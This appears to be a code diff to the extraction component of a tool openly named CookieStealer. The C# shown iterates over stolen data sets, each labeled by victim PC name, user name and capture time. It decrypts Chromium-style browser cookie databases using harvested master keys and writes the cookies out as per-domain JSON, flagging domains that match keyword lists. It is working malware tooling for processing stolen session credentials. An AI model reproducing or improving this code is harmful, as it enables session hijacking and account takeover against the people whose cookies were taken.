@@ -1,29 +1,20 @@
-﻿using System.Diagnostics;
-using System.Runtime.InteropServices;
+﻿using System.Globalization;
 using System.Security.Cryptography;
 using System.Text;
-using System.Text.Json.Serialization;
 using System.Text.RegularExpressions;
 using Microsoft.Data.Sqlite;
 using Newtonsoft.Json;
-using JsonSerializer = System.Text.Json.JsonSerializer;
 
 namespace CookieStealer.Utilities;
 
 public class Extractor
 {
-    private readonly Dictionary<string, bool> _extracted = new Dictionary<string, bool>();
-    private readonly Regex _regex = new Regex(@"^\d{10}$");
+    private readonly Regex _regex = new(@"^\d{10}$");
+    private readonly List<string> _scans = new();
+
     public Extractor()
     {
         ScanDirectory("extracted");
-        _extracted = _extracted.OrderByDescending(x => Path.GetFileName(x.Key))
-            .ToDictionary(pair => pair.Key, pair => pair.Value);
-
-        // foreach (var scan in _extracted)
-        // {
-        //     Console.WriteLine($"{Directory.GetParent(scan.Key).Parent.Name} - {Directory.GetParent(scan.Key).Name} - {Path.GetFileName(scan.Key)}");
-        // }
     }
 
     private void ScanDirectory(string directory)
@@ -33,7 +24,10 @@ public class Extractor
             var directoryName = Path.GetFileName(subDirectory);
             if (_regex.IsMatch(directoryName))
             {
-                _extracted.Add(subDirectory, false);
+                _scans.Add(subDirectory);
+                if (!Directory.GetDirectories(subDirectory).Any(browserDirectory =>
+                        Path.Exists(Path.Combine(browserDirectory, "cookies")))) continue;
+                _scans.Remove(subDirectory);
             }
             else
             {
@@ -41,37 +35,61 @@ public class Extractor
             }
         }
     }
-    
+
+    private void DisplayScan(string scan)
+    {
+        var scanTime = Path.GetFileName(scan);
+        var parsedDate = DateTime.ParseExact(scanTime, "yyMMddHHmm", CultureInfo.InvariantCulture);
+        var formattedDate = parsedDate.ToString("dd.MM.yyyy HH:mm");
+
+        var pcName = Directory.GetParent(scan).Parent.Name;
+        var userName = Directory.GetParent(scan).Name;
+
+        // Calculate the maximum length of the PC and user names in all scans
+        var maxPcNameLength = _scans.Max(s => Directory.GetParent(s).Parent.Name.Length);
+        var maxUserNameLength = _scans.Max(s => Directory.GetParent(s).Name.Length);
+
+        // Use the maximum length for padding
+        Console.WriteLine($"|{new string('-', maxPcNameLength + maxUserNameLength + 40)}|");
+        Console.WriteLine(
+            $"| PC: {pcName.PadRight(maxPcNameLength)} | User: {userName.PadRight(maxUserNameLength)} | Date: {formattedDate} |");
+        Console.WriteLine($"|{new string('-', maxPcNameLength + maxUserNameLength + 40)}|");
+    }
+
     public void DecryptAndExtract()
     {
-        var workingDirectory = _extracted.Keys.First();
-        foreach (var browserPath in Directory.GetDirectories(workingDirectory))
+        foreach (var scanDirectory in _scans)
         {
-            var browserName = Path.GetFileName(browserPath);
-            var databaseDirectory = Path.Combine(browserPath, "database");
-
-            foreach (var directory in Directory.GetDirectories(databaseDirectory))
+            DisplayScan(scanDirectory);
+            foreach (var browserPath in Directory.GetDirectories(scanDirectory))
             {
-                var directoryName = Path.GetFileName(directory);
-                var dbFileName = Path.Combine(directory, "Cookies");
-                
-                if (!Path.Exists(dbFileName))
+                var browserName = Path.GetFileName(browserPath);
+                var databaseDirectory = Path.Combine(browserPath, "database");
+
+                foreach (var directory in Directory.GetDirectories(databaseDirectory))
                 {
-                    continue;
+                    var directoryName = Path.GetFileName(directory);
+                    var dbFileName = Path.Combine(directory, "Cookies");
+
+                    if (!Path.Exists(dbFileName)) continue;
+
+                    File.Copy(dbFileName, dbFileName + "_decrypted", true);
+
+                    if (Path.Exists(databaseDirectory + "\\master.key"))
+                    {
+                        var key = File.ReadAllBytes(Path.Combine(databaseDirectory, "master.key"));
+                        Console.Write($"Decrypting {browserName} ({directoryName}) cookies... ");
+                        DecryptDb(dbFileName + "_decrypted", key);
+                        Console.WriteLine("Done.");
+                    }
+
+                    var extractionPath = Path.Combine(browserPath, "cookies", directoryName);
+                    Directory.CreateDirectory(extractionPath);
+                    ExtractCookies(directory, extractionPath, browserName);
                 }
-                File.Copy(dbFileName, dbFileName + "_decrypted", true);
-                
-                if (Path.Exists(databaseDirectory + "\\master.key"))
-                {
-                    var key = File.ReadAllBytes(Path.Combine(databaseDirectory, "master.key"));
-                    Console.Write($"Decrypting {browserName} ({directoryName}) cookies... ");
-                    DecryptDb(dbFileName + "_decrypted", key);
-                    Console.WriteLine("Done.");
-                }
-                var extractionPath = Path.Combine(browserPath, "cookies", directoryName);
-                Directory.CreateDirectory(extractionPath);
-                ExtractCookies(directory, extractionPath, browserName);
             }
+
+            Console.Clear();
         }
     }
 
@@ -94,19 +112,16 @@ public class Extractor
             FROM cookies
             """;
         var totalRows = Convert.ToInt32(countCommand.ExecuteScalar());
-        
+
         using (var progress = new ProgressBar())
         {
             using var reader = command.ExecuteReader();
 
-            int i = 0;
+            var i = 0;
             while (reader.Read())
             {
                 var name = reader["name"].ToString();
-                if (string.IsNullOrEmpty(name))
-                {
-                    continue;
-                }
+                if (string.IsNullOrEmpty(name)) continue;
 
                 var encryptedValue = (byte[])reader["encrypted_value"];
                 var creationUtc = reader["creation_utc"].ToString();
@@ -134,7 +149,7 @@ public class Extractor
     {
         var nonce = cookie[3..15];
         var ciphertext = cookie[15..^16];
-        var tag = cookie[^16..(cookie.Length)];
+        var tag = cookie[^16..cookie.Length];
 
         var resultBytes = new byte[ciphertext.Length];
 
@@ -144,10 +159,9 @@ public class Extractor
         return cookieValue;
     }
 
-
     private static void ExtractCookies(string cookiesPath, string extractionPath, string browserName)
     {
-        using var connection = new SqliteConnection($"Data Source={Path.Combine(cookiesPath, "Cookies")}");
+        using var connection = new SqliteConnection($"Data Source={Path.Combine(cookiesPath, "Cookies_decrypted")}");
         connection.Open();
 
         var command = connection.CreateCommand();
@@ -203,37 +217,28 @@ public class Extractor
             };
 
             var domain = Translator.FileName(cookie.domain);
-            if (!cookies.ContainsKey(domain))
-            {
-                cookies[domain] = new List<dynamic>();
-            }
+            if (!cookies.ContainsKey(domain)) cookies[domain] = new List<dynamic>();
 
             cookies[domain].Add(cookie);
         }
-        
+
         var adsDomains = new HashSet<string>(File.ReadLines(Path.Combine("FilterList", "ads.txt")));
         var keywords = new List<string>(File.ReadLines(Path.Combine("FilterList", "keywords.txt")));
         Directory.CreateDirectory(Path.Combine(extractionPath, "ads"));
         Directory.CreateDirectory(Path.Combine(extractionPath, "keywords"));
-        
+
         foreach (var domain in cookies.Keys)
         {
             var json = JsonConvert
                 .SerializeObject(cookies[domain], Formatting.Indented);
             string path;
-            
+
             if (adsDomains.Contains(domain))
-            {
                 path = Path.Combine(extractionPath, "ads", $"{domain}.json");
-            }
             else if (keywords.Any(keyword => domain.Contains(keyword)))
-            {
                 path = Path.Combine(extractionPath, "keywords", $"{domain}.json");
-            }
             else
-            {
                 path = Path.Combine(extractionPath, $"{domain}.json");
-            }
             File.WriteAllText(path, json);
         }
     }
